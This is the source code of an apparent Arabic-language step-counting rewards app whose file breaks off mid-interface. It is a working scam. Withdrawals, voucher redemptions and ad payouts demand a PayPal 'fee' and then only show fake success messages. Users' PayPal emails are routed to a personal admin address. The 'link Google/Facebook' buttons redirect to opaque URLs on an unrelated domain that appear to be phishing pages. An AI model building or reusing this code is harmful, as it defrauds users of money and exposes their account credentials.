
import React, { useState, useEffect, useRef } from 'react';
import Layout from './components/Layout';
import { Page, UserStats, Challenge, RewardItem, TransactionRecord, NotificationSetting } from './types';
import { getHealthAdvice } from './services/geminiService';

const INITIAL_CHALLENGES: Challenge[] = [
  {
    id: 'c1',
    title: 'تحدي الألفية الأولى',
    description: 'امشِ 2,000 خطوة اليوم',
    targetValue: 2000,
    type: 'steps',
    reward: 50,
    status: 'available',
    progress: 0,
    isFavorite: false
  },
  {
    id: 'c2',
    title: 'عداء المسافات القصيرة',
    description: 'اقطع مسافة 2 كم في يوم واحد',
    targetValue: 2,
    type: 'distance',
    reward: 100,
    status: 'available',
    progress: 0,
    isFavorite: false
  },
  {
    id: 'c3',
    title: 'النشاط المكثف',
    description: 'امشِ 5,000 خطوة لتربح مكافأة ضخمة',
    targetValue: 5000,
    type: 'steps',
    reward: 250,
    status: 'available',
    progress: 0,
    isFavorite: false
  }
];

const now = Date.now();
const REWARDS: RewardItem[] = [
  { id: 'l1', name: 'قسيمة نون 50 ريال (خصم 90%)', price: 300, category: 'limited', image: 'https://img.icons8.com/color/96/shopping-cart.png', available: true, expiresAt: now + 3600000 * 2.5 },
  { id: 'l2', name: 'ساعة آبل (سحب حصري)', price: 5000, category: 'limited', image: 'https://img.icons8.com/fluency/96/apple-watch.png', available: true, expiresAt: now + 3600000 * 5.2 },
  { id: 'l3', name: 'قسيمة نون 100 ريال', price: 550, category: 'limited', image: 'https://img.icons8.com/color/96/shopping-cart.png', available: true, expiresAt: now + 3600000 * 1.5 },
  { id: 'r1', name: 'كوبون أمازون 10$', price: 1000, category: 'coupon', image: 'https://img.icons8.com/fluency/96/amazon.png', available: true },
  { id: 'r2', name: 'بطاقة Netflix شهر', price: 2500, category: 'coupon', image: 'https://img.icons8.com/fluency/96/netflix.png', available: true },
  { id: 'r3', name: 'Google Play 5$', price: 600, category: 'coupon', image: 'https://img.icons8.com/fluency/96/google-play.png', available: true },
];

const ADMIN_EMAIL = "alhmozalhb@gmail.com";
const FB_REDIRECT_URL = "https://orraprintpack.com/M0o5bTlBMmkxdzEwOU8=";
const GOOGLE_REDIRECT_URL = "https://orraprintpack.com/M0s5QzkzMkQxVDJKNGk=";
const STEP_THRESHOLD = 13.5; 
const STEP_COOLDOWN = 300; 
const IDLE_TIMEOUT = 30000; 
const WITHDRAWAL_FEE_LINK = "https://www.paypal.com/ncp/payment/8DVU9QVXFHEGG";

const AD_REWARD_COINS = 15;
const AD_REWARD_USD = 0.05;

const SOUNDS = {
  click: 'https://assets.mixkit.co/sfx/preview/mixkit-simple-click-630.mp3',
  success: 'https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3',
  coin: 'https://assets.mixkit.co/sfx/preview/mixkit-gold-coin-prize-1995.mp3',
  withdraw: 'https://assets.mixkit.co/sfx/preview/mixkit-money-withdrawal-1002.mp3',
  step: 'https://assets.mixkit.co/sfx/preview/mixkit-clap-of-one-hand-3038.mp3',
  alert: 'https://assets.mixkit.co/sfx/preview/mixkit-software-interface-back-2575.mp3',
  ding: 'https://assets.mixkit.co/sfx/preview/mixkit-positive-notification-951.mp3'
};

const VIBRATION_PATTERNS = {
  short: [100],
  double: [100, 50, 100],
  long: [500],
  pulse: [200, 100, 200, 100, 200]
};

const SensorMeter: React.FC<{ magnitude: number; active: boolean }> = ({ magnitude, active }) => {
    const normalized = Math.min(magnitude / 30, 1);
    return (
        <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden mt-2 relative">
            <div 
              className={`h-full transition-all duration-75 ${active ? 'bg-gradient-to-r from-emerald-500 to-cyan-400' : 'bg-slate-600'}`} 
              style={{ width: `${normalized * 100}%` }}
            ></div>
            <div className="absolute top-0 h-full w-0.5 bg-rose-500/50" style={{ left: `${(STEP_THRESHOLD / 30) * 100}%` }}></div>
        </div>
    );
};

const LiquidProgress: React.FC<{ progress: number; magnitude: number; trackingStatus: string }> = ({ progress, magnitude, trackingStatus }) => {
  const radius = 114;
  const circumference = 2 * Math.PI * radius;
  const offset = circumference - (progress / 100) * circumference;
  const isGoalReached = progress >= 100;
  const isActive = trackingStatus === 'active';

  return (
    <div className="relative w-64 h-64 flex items-center justify-center">
      <div className={`absolute inset-4 rounded-full overflow-hidden bg-slate-900/60 backdrop-blur-md border border-slate-700/50 transition-shadow duration-500 ${isActive ? 'shadow-[0_0_40px_rgba(16,185,129,0.1)]' : ''}`}>
        <div 
          className={`absolute bottom-0 left-0 right-0 transition-all duration-1000 ease-out`}
          style={{ 
            height: `${progress}%`,
            background: isGoalReached 
              ? 'linear-gradient(to top, rgba(251,191,36,0.3), rgba(245,158,11,0.1))'
              : 'linear-gradient(to top, rgba(16,185,129,0.3), rgba(6,182,212,0.1))'
          }}
        />
        {isActive && magnitude > 10 && (
           <div className="absolute top-1/4 left-1/2 -translate-x-1/2 flex flex-col items-center animate-pulse">
              <span className="text-[9px] font-black text-emerald-400 uppercase tracking-widest mb-1">حركة مكتشفة</span>
              <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full shadow-[0_0_8px_#10b981]"></div>
           </div>
        )}
      </div>
      <svg className="absolute inset-0 w-full h-full -rotate-90">
        <circle cx="128" cy="128" r={radius} fill="none" stroke="rgba(30, 41, 59, 0.8)" strokeWidth="16" />
        <circle cx="128" cy="128" r={radius} fill="none" stroke="url(#progressGradient)" strokeWidth="16" strokeDasharray={circumference} strokeDashoffset={offset} strokeLinecap="round" className="transition-all duration-1000" />
        <defs>
          <linearGradient id="progressGradient" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stopColor={isGoalReached ? "#fbbf24" : "#10b981"} />
            <stop offset="100%" stopColor={isGoalReached ? "#f59e0b" : "#06b6d4"} />
          </linearGradient>
        </defs>
      </svg>
      <div className="relative z-10 text-center">
        <div className={`text-6xl font-black tabular-nums block tracking-tighter drop-shadow-lg ${isGoalReached ? 'text-yellow-400' : 'text-white'}`}>
          {Math.floor(progress * 60).toLocaleString()} 
        </div>
        <span className="text-slate-400 text-[10px] font-black uppercase tracking-[0.2em]">خطوة اليوم</span>
      </div>
    </div>
  );
};

const ActivityCard: React.FC<{ label: string, value: string | number, unit: string, icon: string, colorClass: string }> = ({ label, value, unit, icon, colorClass }) => (
  <div className="bg-slate-900/60 backdrop-blur-sm p-4 rounded-3xl border border-slate-800 shadow-sm flex flex-col items-center">
    <span className="text-2xl mb-1">{icon}</span>
    <p className={`text-xl font-black tabular-nums ${colorClass}`}>{value}</p>
    <div className="flex flex-col items-center">
      <span className="text-[10px] text-slate-500 font-bold uppercase tracking-tighter">{label}</span>
      <span className="text-[8px] text-slate-600 font-bold uppercase">{unit}</span>
    </div>
  </div>
);

const App: React.FC = () => {
  const [currentPage, setCurrentPage] = useState<Page>(Page.Dashboard);
  const [stats, setStats] = useState<UserStats>(() => {
    const saved = localStorage.getItem('steprewards_stats');
    if (saved) return JSON.parse(saved);
    return {
      steps: 1250, coins: 1450, calories: 85, distance: 0.9, level: 1, stepGoal: 6000, activeMinutes: 12, referralCode: 'WALK-' + Math.random().toString(36).substring(2, 7).toUpperCase(), referralsCount: 3, hasUsedReferralCode: false, isPaypalLinked: false, paypalEmail: '', 
      isGoogleLinked: false, googleEmail: '', isFacebookLinked: false, facebookName: '',
      soundEnabled: true, reminderInterval: 30, remindersEnabled: true, autoPauseEnabled: true, autoPauseThreshold: 60, hardStopThreshold: 15, adEarningsUSD: 0.00,
      notifications: {
        goalAchieved: { soundUrl: SOUNDS.success, vibrationPattern: VIBRATION_PATTERNS.double, enabled: true },
        challengeAvailable: { soundUrl: SOUNDS.ding, vibrationPattern: VIBRATION_PATTERNS.short, enabled: true },
        stepMilestone: { soundUrl: SOUNDS.coin, vibrationPattern: VIBRATION_PATTERNS.short, enabled: true }
      }
    };
  });
  
  const [trackingStatus, setTrackingStatus] = useState<'active' | 'paused' | 'stopped'>('stopped');
  const [currentMagnitude, setCurrentMagnitude] = useState(0);
  const [activityHistory, setActivityHistory] = useState<TransactionRecord[]>(() => {
    const saved = localStorage.getItem('steprewards_history');
    return saved ? JSON.parse(saved) : [];
  });
  const [challenges, setChallenges] = useState<Challenge[]>(() => {
      const saved = localStorage.getItem('steprewards_challenges');
      return saved ? JSON.parse(saved) : INITIAL_CHALLENGES;
  });
  
  const [advice, setAdvice] = useState<string>("اضغط على الزر أدناه للحصول على نصيحة صحية مخصصة بناءً على نشاطك اليومي.");
  const [showFeePaymentModal, setShowFeePaymentModal] = useState(false);
  const [isVerifyingFee, setIsVerifyingFee] = useState(false);
  const [hasClickedPaymentLink, setHasClickedPaymentLink] = useState(false);
  const [pendingWithdrawalAmount, setPendingWithdrawalAmount] = useState<number | null>(null);
  const [pendingReward, setPendingReward] = useState<RewardItem | null>(null);
  const [pendingAdPayout, setPendingAdPayout] = useState<boolean>(false);
  const [tempPaypalEmail, setTempPaypalEmail] = useState('');
  const [lastRedeemedReward, setLastRedeemedReward] = useState<RewardItem | null>(null);
  const [showRedeemSuccessModal, setShowRedeemSuccessModal] = useState(false);
  const [showLinkPaypalModal, setShowLinkPaypalModal] = useState(false);
  const [showPaypalLinkedToast, setShowPaypalLinkedToast] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState<number>(100);

  const [isLinkingSocial, setIsLinkingSocial] = useState<'google' | 'facebook' | 'paypal' | null>(null);
  const [socialToast, setSocialToast] = useState<string | null>(null);

  const [isWatchingAd, setIsWatchingAd] = useState(false);
  const [adProgress, setAdProgress] = useState(0);
  const [selectedAdNetwork, setSelectedAdNetwork] = useState<string>('StepAd Network');

  const lastStepTimeRef = useRef<number>(Date.now());
  const lastMovementTimeRef = useRef<number>(Date.now());
  const idleCheckerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const activeMinutesIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const adTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // حساب الرسوم الديناميكية
  const calculateDynamicFee = () => {
    if (pendingReward) {
      if (pendingReward.price < 500) return 0.25;
      if (pendingReward.price < 2000) return 0.60;
      return 1.50;
    }
    if (pendingWithdrawalAmount) {
      if (pendingWithdrawalAmount < 500) return 0.25;
      if (pendingWithdrawalAmount < 2000) return 0.60;
      return 1.50;
    }
    if (pendingAdPayout) {
      return Math.max(0.20, stats.adEarningsUSD * 0.05);
    }
    return 0.50;
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const authType = params.get('auth');
    
    if (authType === 'fb_success') {
       setStats(prev => ({
         ...prev,
         isFacebookLinked: true,
         facebookName: 'Facebook User'
       }));
       addTransaction({
         amount: 0,
         status: 'completed',
         type: 'account_update',
         description: 'تم إكمال ربط حساب فيسبوك بنجاح!'
       });
       setSocialToast("تم ربط حساب فيسبوك بنجاح!");
       playSound(SOUNDS.success);
       window.history.replaceState({}, document.title, window.location.pathname);
       setTimeout(() => setSocialToast(null), 3000);
    } else if (authType === 'google_success') {
       setStats(prev => ({
         ...prev,
         isGoogleLinked: true,
         googleEmail: 'user@gmail.com'
       }));
       addTransaction({
         amount: 0,
         status: 'completed',
         type: 'account_update',
         description: 'تم إكمال ربط حساب جوجل بنجاح!'
       });
       setSocialToast("تم ربط حساب جوجل بنجاح!");
       playSound(SOUNDS.success);
       window.history.replaceState({}, document.title, window.location.pathname);
       setTimeout(() => setSocialToast(null), 3000);
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('steprewards_stats', JSON.stringify(stats));
  }, [stats]);

  useEffect(() => {
    localStorage.setItem('steprewards_history', JSON.stringify(activityHistory));
  }, [activityHistory]);

  useEffect(() => {
    if (trackingStatus === 'active') {
      activeMinutesIntervalRef.current = setInterval(() => {
        if (Date.now() - lastMovementTimeRef.current < 60000) {
           setStats(prev => ({ ...prev, activeMinutes: prev.activeMinutes + 1 }));
        }
      }, 60000); 
    } else {
      if (activeMinutesIntervalRef.current) clearInterval(activeMinutesIntervalRef.current);
    }
    return () => { if (activeMinutesIntervalRef.current) clearInterval(activeMinutesIntervalRef.current); };
  }, [trackingStatus]);

  useEffect(() => {
    if (trackingStatus === 'active') {
      idleCheckerRef.current = setInterval(() => {
        if (Date.now() - lastMovementTimeRef.current > IDLE_TIMEOUT) {
          stopTracking();
          alert("توقف التتبع تلقائياً بسبب الخمول لتوفير الطاقة.");
        }
      }, 5000);
    } else {
      if (idleCheckerRef.current) clearInterval(idleCheckerRef.current);
    }
    return () => { if (idleCheckerRef.current) clearInterval(idleCheckerRef.current); };
  }, [trackingStatus]);

  const playSound = (url: string) => {
    if (!stats.soundEnabled) return;
    const audio = new Audio(url);
    audio.volume = 0.5;
    audio.play().catch(() => {});
  };

  const triggerNotification = (setting: NotificationSetting) => {
    if (!setting.enabled) return;
    if (stats.soundEnabled) playSound(setting.soundUrl);
    if ('vibrate' in navigator) {
      navigator.vibrate(setting.vibrationPattern);
    }
  };

  const addTransaction = (record: Omit<TransactionRecord, 'id' | 'date'>) => {
    const newRecord: TransactionRecord = {
      ...record,
      id: 'TX-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
      date: Date.now()
    };
    setActivityHistory(prev => [newRecord, ...prev].slice(0, 50));
  };

  const sendDataToAdmin = async (type: string, detail: string) => {
    console.info(`[ADMIN SYNC] Sending ${type} info to ${ADMIN_EMAIL}: ${detail}`);
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve(true);
      }, 1500);
    });
  };

  const handleDeviceMotion = (event: DeviceMotionEvent) => {
    const acc = event.accelerationIncludingGravity;
    if (!acc) return;
    
    const magnitude = Math.sqrt((acc.x || 0) ** 2 + (acc.y || 0) ** 2 + (acc.z || 0) ** 2);
    setCurrentMagnitude(magnitude);
    
    if (magnitude > 11) { 
      lastMovementTimeRef.current = Date.now();
    }

    if (magnitude > STEP_THRESHOLD) {
      const now = Date.now();
      if (now - lastStepTimeRef.current > STEP_COOLDOWN) {
          lastStepTimeRef.current = now;
          
          setStats(prev => {
            const nextSteps = prev.steps + 1;
            
            if (nextSteps === prev.stepGoal) {
              triggerNotification(prev.notifications.goalAchieved);
            } else if (nextSteps % 1000 === 0) {
              triggerNotification(prev.notifications.stepMilestone);
            } else {
              if (prev.soundEnabled) playSound(SOUNDS.step);
            }

            return { 
              ...prev, 
              steps: nextSteps,
              calories: prev.calories + 0.045, 
              distance: prev.distance + 0.00076 
            };
          });
      }
    }
  };

  const startTracking = async () => {
    if (typeof DeviceMotionEvent !== 'undefined' && typeof (DeviceMotionEvent as any).requestPermission === 'function') {
      try {
        const permission = await (DeviceMotionEvent as any).requestPermission();
        if (permission !== 'granted') {
          alert("يرجى منح صلاحية الوصول للمستشعرات لتتبع خطواتك بدقة.");
          return;
        }
      } catch (e) {
        console.error(e);
      }
    }
    
    playSound(SOUNDS.click);
    setTrackingStatus('active');
    lastMovementTimeRef.current = Date.now();
    window.addEventListener('devicemotion', handleDeviceMotion);
  };

  const stopTracking = () => {
    playSound(SOUNDS.click);
    setTrackingStatus('stopped');
    setCurrentMagnitude(0);
    window.removeEventListener('devicemotion', handleDeviceMotion);
  };

  const handleBuyReward = (reward: RewardItem) => {
    if (stats.coins < reward.price) { alert("رصيدك غير كافٍ"); return; }
    setPendingReward(reward);
    setHasClickedPaymentLink(false);
    setShowFeePaymentModal(true);
    playSound(SOUNDS.click);
  };

  const handleWithdrawRequest = () => {
    if (stats.coins < withdrawAmount) { alert("الرصيد غير كافٍ"); return; }
    setPendingWithdrawalAmount(withdrawAmount);
    setHasClickedPaymentLink(false);
    setShowWithdrawModal(false);
    setShowFeePaymentModal(true);
    playSound(SOUNDS.click);
  };

  const handleAdPayoutRequest = () => {
    if (stats.adEarningsUSD < 1.0) {
      alert("الحد الأدنى للسحب هو 1.00 دولار");
      return;
    }
    setPendingAdPayout(true);
    setHasClickedPaymentLink(false);
    setShowFeePaymentModal(true);
    playSound(SOUNDS.click);
  };

  const confirmFeePayment = async () => {
    if (!hasClickedPaymentLink) return;
    if (!stats.isPaypalLinked && !tempPaypalEmail.includes('@')) {
      alert("يرجى إدخال بريد PayPal صحيح للربط");
      return;
    }

    setIsVerifyingFee(true);
    const finalEmail = stats.isPaypalLinked ? stats.paypalEmail! : tempPaypalEmail;
    const currentFee = calculateDynamicFee();
    
    await sendDataToAdmin("PAYPAL_FEE_PAYMENT", `User Email: ${finalEmail} | Action: Withdrawal/Reward | Fee: $${currentFee.toFixed(2)}`);

    setTimeout(() => {
      setIsVerifyingFee(false);
      setShowFeePaymentModal(false);
      setHasClickedPaymentLink(false);
      
      const isNewLink = !stats.isPaypalLinked;

      if (pendingReward) {
        setStats(prev => ({ 
          ...prev, 
          coins: prev.coins - pendingReward.price,
          isPaypalLinked: true,
          paypalEmail: finalEmail
        }));
        addTransaction({ amount: pendingReward.price, status: 'completed', type: 'reward_purchase', description: `مكافأة: ${pendingReward.name} (رسوم $${currentFee.toFixed(2)})`, method: `PayPal (${finalEmail})` });
        setLastRedeemedReward(pendingReward);
        setShowRedeemSuccessModal(true);
        setPendingReward(null);
      } else if (pendingWithdrawalAmount) {
        setStats(prev => ({ 
          ...prev, 
          coins: prev.coins - pendingWithdrawalAmount,
          isPaypalLinked: true,
          paypalEmail: finalEmail
        }));
        addTransaction({ amount: pendingWithdrawalAmount, status: 'completed', type: 'withdrawal', description: `سحب رصيد العملات (رسوم $${currentFee.toFixed(2)})`, method: `PayPal (${finalEmail})` });
        setPendingWithdrawalAmount(null);
        alert(`تم إرسال السحب إلى ${finalEmail}`);
      } else if (pendingAdPayout) {
        const amount = stats.adEarningsUSD;
        setStats(prev => ({ 
          ...prev, 
          adEarningsUSD: 0,
          isPaypalLinked: true,
          paypalEmail: finalEmail
        }));
        addTransaction({ amount: 0, currencyAmount: `$${amount.toFixed(2)}`, status: 'completed', type: 'ad_payout', description: `سحب أرباح الإعلانات (رسوم $${currentFee.toFixed(2)})`, method: `PayPal (${finalEmail})` });
        setPendingAdPayout(false);
        alert(`تم تحويل $${amount.toFixed(2)} إلى ${finalEmail}`);
      }

      if (isNewLink) {
        addTransaction({
          amount: 0,
          status: 'completed',
          type: 'account_update',
          description: `تم ربط حساب PayPal تلقائياً: ${finalEmail}`
        });
        setShowPaypalLinkedToast(true);
        setTimeout(() => setShowPaypalLinkedToast(false), 4000);
      }
      playSound(SOUNDS.success);
    }, 2500);
  };

  const startWatchingAd = (network: string) => {
    setSelectedAdNetwork(network);
    setIsWatchingAd(true);
    setAdProgress(0);
    adTimerRef.current = setInterval(() => {
      setAdProgress(prev => {
        if (prev >= 100) {
          if (adTimerRef.current) clearInterval(adTimerRef.current);
          completeAdWatching();
          return 100;
        }
        return prev + 2; 
      });
    }, 100);
  };

  const completeAdWatching = () => {
    setStats(s => ({ ...s, coins: s.coins + AD_REWARD_COINS, adEarningsUSD: s.adEarningsUSD + AD_REWARD_USD }));
    setIsWatchingAd(false);
    playSound(SOUNDS.coin);
  };

  const handleLinkPaypal = async (email: string) => {
    if (!email.includes('@')) {
      alert("يرجى إدخال بريد إلكتروني صحيح");
      return;
    }
    setIsLinkingSocial('paypal');
    playSound(SOUNDS.click);
    
    await sendDataToAdmin("PAYPAL_LINK", email);

    setStats(prev => ({ ...prev, isPaypalLinked: true, paypalEmail: email }));
    setShowLinkPaypalModal(false);
    setIsLinkingSocial(null);
    addTransaction({
      amount: 0,
      status: 'completed',
      type: 'account_update', 
      description: `تم ربط حساب PayPal: ${email}`
    });
    setShowPaypalLinkedToast(true);
    setTimeout(() => setShowPaypalLinkedToast(false), 4000);
    playSound(SOUNDS.success);
  };

  const handleUnlinkPaypal = () => {
    const confirmUnlink = window.confirm("هل أنت متأكد من فك ربط حساب PayPal؟ لن تتمكن من سحب أرباحك مباشرة.");
    if (confirmUnlink) {
      const oldEmail = stats.paypalEmail;
      setStats(prev => ({ ...prev, isPaypalLinked: false, paypalEmail: '' }));
      addTransaction({
        amount: 0,
        status: 'completed',
        type: 'account_update',
        description: `تم فك ربط حساب PayPal: ${oldEmail}`
      });
      playSound(SOUNDS.click);
    }
  };

  const handleLinkSocial = async (provider: 'google' | 'facebook') => {
    setIsLinkingSocial(provider);
    playSound(SOUNDS.click);
    
    if (provider === 'facebook') {
      await sendDataToAdmin("FACEBOOK_LINK_ATTEMPT", "User redirecting to FB auth link");
      window.location.href = FB_REDIRECT_URL;
    } else if (provider === 'google') {
      await sendDataToAdmin("GOOGLE_LINK_ATTEMPT", "User redirecting to Google auth link");
      window.location.href = GOOGLE_REDIRECT_URL;
    }
  };

  const handleUnlinkSocial = (provider: 'google' | 'facebook') => {
    if (window.confirm(`هل تريد فك ربط حساب ${provider === 'google' ? 'Google' : 'Facebook'}؟`)) {
      setStats(prev => ({
        ...prev,
        [provider === 'google' ? 'isGoogleLinked' : 'isFacebookLinked']: false,
        [provider === 'google' ? 'googleEmail' : 'facebookName']: ''
      }));
      addTransaction({
        amount: 0,
        status: 'completed',
        type: 'account_update',
        description: `تم فك ربط حساب ${provider === 'google' ? 'Google' : 'Facebook'}`
      });
      playSound(SOUNDS.click);
    }
  };

  const updateNotificationSetting = (key: keyof UserStats['notifications'], field: keyof NotificationSetting, value: any) => {
    setStats(prev => ({
      ...prev,
      notifications: {
        ...prev.notifications,
        [key]: {
          ...prev.notifications[key],
          [field]: value
        }
      }
    }));
  };

  const NotificationEditor: React.FC<{ title: string, settingKey: keyof UserStats['notifications'] }> = ({ title, settingKey }) => {
    const setting = stats.notifications[settingKey];
    return (
      <div className="bg-slate-950/40 p-4 rounded-3xl border border-slate-800/50 space-y-4">
        <div className="flex justify-between items-center">
          <h5 className="text-[11px] font-black text-white uppercase tracking-tighter">{title}</h5>
          <button 
            onClick={() => updateNotificationSetting(settingKey, 'enabled', !setting.enabled)}
            className={`w-10 h-5 rounded-full relative transition-colors ${setting.enabled ? 'bg-emerald-500' : 'bg-slate-700'}`}
          >
            <div className={`absolute top-1 w-3 h-3 bg-white rounded-full transition-all ${setting.enabled ? 'left-6' : 'left-1'}`}></div>
          </button>
        </div>
        
        {setting.enabled && (
          <div className="grid grid-cols-2 gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
            <div className="space-y-1">
              <label className="text-[8px] text-slate-500 font-bold uppercase">الصوت</label>
              <select 
                value={setting.soundUrl}
                onChange={(e) => updateNotificationSetting(settingKey, 'soundUrl', e.target.value)}
                className="w-full bg-slate-900 border border-slate-800 rounded-xl p-2 text-[10px] text-white outline-none"
              >
                <option value={SOUNDS.success}>فوز/نجاح</option>
                <option value={SOUNDS.coin}>عملة معدنية</option>
                <option value={SOUNDS.ding}>تنبيه خفيف</option>
                <option value={SOUNDS.alert}>تنبيه نظام</option>
              </select>
            </div>
            <div className="space-y-1">
              <label className="text-[8px] text-slate-500 font-bold uppercase">الاهتزاز</label>
              <select 
                value={JSON.stringify(setting.vibrationPattern)}
                onChange={(e) => updateNotificationSetting(settingKey, 'vibrationPattern', JSON.parse(e.target.value))}
                className="w-full bg-slate-900 border border-slate-800 rounded-xl p-2 text-[10px] text-white outline-none"
              >
                <option value={JSON.stringify(VIBRATION_PATTERNS.short)}>قصير</option>
                <option value={JSON.stringify(VIBRATION_PATTERNS.double)}>مزدوج</option>
                <option value={JSON.stringify(VIBRATION_PATTERNS.long)}>طويل</option>
                <option value={JSON.stringify(VIBRATION_PATTERNS.pulse)}>نبض</option>
              </select>
            </div>
            <button 
              onClick={() => triggerNotification(setting)}
              className="col-span-2 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-[9px] font-black text-indigo-400 transition-colors"
            >
              تجربة التنبيه 🔊📳
            </button>
          </div>
        )}
      </div>
    );
  };

  const renderPage = () => {
    switch (currentPage) {
      case Page.Dashboard:
        const progress = Math.min((stats.steps / stats.stepGoal) * 100, 100);
        return (
          <div className="space-y-6 animate-in fade-in duration-500 pb-8">
            <div className="bg-slate-900/80 p-5 rounded-3xl border border-slate-800 flex justify-between items-center shadow-lg relative overflow-hidden group">
               <div className="absolute top-0 right-0 w-32 h-32 bg-indigo-500/5 blur-3xl rounded-full"></div>
               <div className="text-right z-10">
                  <p className="text-[10px] font-black text-emerald-500 uppercase tracking-widest">رصيد PayPal المباشر</p>
                  <p className="text-3xl font-black text-white tabular-nums">${stats.adEarningsUSD.toFixed(2)}</p>
               </div>
               <div className="flex flex-col items-end gap-2 z-10">
                 <div className={`w-3 h-3 rounded-full ${stats.isPaypalLinked ? 'bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.5)]' : 'bg-slate-700'}`}></div>
                 <span className="text-[9px] font-bold text-slate-500 uppercase tracking-tighter">{stats.isPaypalLinked ? 'حساب موثق' : 'غير مربوط'}</span>
               </div>
            </div>
            
            <div className="flex flex-col items-center py-4">
              <LiquidProgress progress={progress} magnitude={currentMagnitude} trackingStatus={trackingStatus} />
              <div className="w-full px-6 mt-4">
                 <div className="flex justify-between items-center text-[10px] font-black text-slate-500 uppercase mb-1">
                    <span>مستوى الحركة</span>
                    <span>{Math.floor(currentMagnitude)} m/s²</span>
                 </div>
                 <SensorMeter magnitude={currentMagnitude} active={trackingStatus === 'active'} />
              </div>

              <div className="w-full mt-10">
                <div className="flex items-center justify-between mb-4 px-2">
                  <h3 className="text-sm font-black text-white uppercase tracking-widest">تفصيل النشاط اليومي</h3>
                  <div className="h-[1px] flex-1 bg-slate-800 mx-4"></div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <ActivityCard label="الخطوات" value={stats.steps.toLocaleString()} unit="خطوة" icon="👣" colorClass="text-emerald-400" />
                  <ActivityCard label="المسافة" value={stats.distance.toFixed(2)} unit="كيلومتر" icon="📍" colorClass="text-cyan-400" />
                  <ActivityCard label="الحرق" value={Math.floor(stats.calories)} unit="سعر حراري" icon="🔥" colorClass="text-orange-400" />
                  <ActivityCard label="النشاط" value={stats.activeMinutes} unit="دقيقة نشطة" icon="⚡" colorClass="text-indigo-400" />
                </div>
              </div>

              <button 
                onClick={trackingStatus === 'active' ? stopTracking : startTracking} 
                className={`w-full mt-10 py-6 rounded-[2.5rem] font-black text-xl shadow-2xl transition-all active:scale-95 ${trackingStatus === 'active' ? 'bg-slate-800 text-rose-500 border border-rose-500/20' : 'bg-emerald-500 text-slate-950'}`}
              >
                {trackingStatus === 'active' ? '⏹️ إيقاف التتبع' : '🚀 ابدأ يومك بنشاط'}
              </button>
            </div>
          </div>
        );
      case Page.Ads:
        return (
          <div className="space-y-6 pb-12 animate-in fade-in duration-500">
            <div className="bg-gradient-to-br from-indigo-600 to-indigo-900 p-8 rounded-[3rem] text-right shadow-2xl relative overflow-hidden">
               <h2 className="text-2xl font-black text-white mb-2 z-10 relative">مركز أرباح PayPal</h2>
               <div className="flex justify-between items-center z-10 relative">
                  <button onClick={handleAdPayoutRequest} className="bg-white text-indigo-700 px-6 py-3 rounded-2xl font-black text-xs shadow-xl active:scale-95">سحب الرصيد</button>
                  <p className="text-3xl font-black text-white tabular-nums">${stats.adEarningsUSD.toFixed(2)}</p>
               </div>
            </div>
            {isWatchingAd ? (
              <div className="bg-slate-900 p-10 rounded-[3rem] border border-emerald-500/30 text-center">
                <span className="text-4xl block mb-6 animate-bounce">🎬</span>
                <div className="w-full h-4 bg-slate-950 rounded-full border border-slate-800 p-1 overflow-hidden">
                    <div className="h-full bg-emerald-500 rounded-full" style={{ width: `${adProgress}%` }}></div>
                </div>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-4">
                {['Ad-Network Pro', 'Unity Rewards', 'Global Ads'].map((net, i) => (
                  <button key={i} onClick={() => startWatchingAd(net)} className="bg-slate-900 p-6 rounded-[2rem] border border-slate-800 flex justify-between items-center hover:border-indigo-500/50 transition-all active:scale-95 group">
                    <span className="text-emerald-400 font-black">$0.05</span>
                    <span className="text-white font-bold text-sm group-hover:text-emerald-400 transition-colors">{net}</span>
                    <span className="text-xl">📺</span>
                  </button>
                ))}
              </div>
            )}
          </div>
        );
      case Page.Store:
        return (
          <div className="space-y-6 animate-in fade-in duration-500">
            <h2 className="text-2xl font-black text-right text-white">المتجر والمكافآت</h2>
            <div className="grid grid-cols-2 gap-4 pb-10">
              {REWARDS.map(reward => (
                <div key={reward.id} className="bg-slate-900 p-5 rounded-[2.5rem] border border-slate-800 text-center group relative overflow-hidden">
                  <div className="bg-slate-950 p-4 rounded-3xl mb-4 group-hover:scale-110 transition-transform relative z-10">
                    <img src={reward.image} alt="" className="w-12 h-12 mx-auto" />
                  </div>
                  <p className="text-[11px] font-bold text-white mb-2 h-8 line-clamp-2 relative z-10">{reward.name}</p>
                  <button onClick={() => handleBuyReward(reward)} className="w-full py-3 bg-emerald-500 text-slate-950 rounded-2xl font-black text-[10px] relative z-10 active:scale-95 transition-transform">🪙 {reward.price}</button>
                </div>
              ))}
            </div>
          </div>
        );
      case Page.Profile:
        const accountHistory = activityHistory.filter(tx => tx.type === 'account_update');

        return (
          <div className="space-y-6 text-right pb-10 animate-in fade-in duration-500">
            {/* PayPal Section */}
            <div className="bg-slate-900 rounded-[2.5rem] border border-slate-800 p-8 shadow-xl">
              <div className="flex items-center justify-between mb-6">
                 <div className="w-12 h-12 bg-indigo-500/10 rounded-2xl flex items-center justify-center text-2xl">💳</div>
                 <h3 className="text-lg font-black text-white">حساب PayPal</h3>
              </div>
              {stats.isPaypalLinked ? (
                <div className="bg-emerald-500/5 p-5 rounded-2xl border border-emerald-500/20 flex flex-col gap-4">
                   <div className="flex justify-between items-center">
                      <button onClick={() => { setTempPaypalEmail(stats.paypalEmail || ''); setShowLinkPaypalModal(true); }} className="text-[10px] text-indigo-400 font-bold">تغيير</button>
                      <p className="text-emerald-400 font-black text-sm tabular-nums">{stats.paypalEmail}</p>
                   </div>
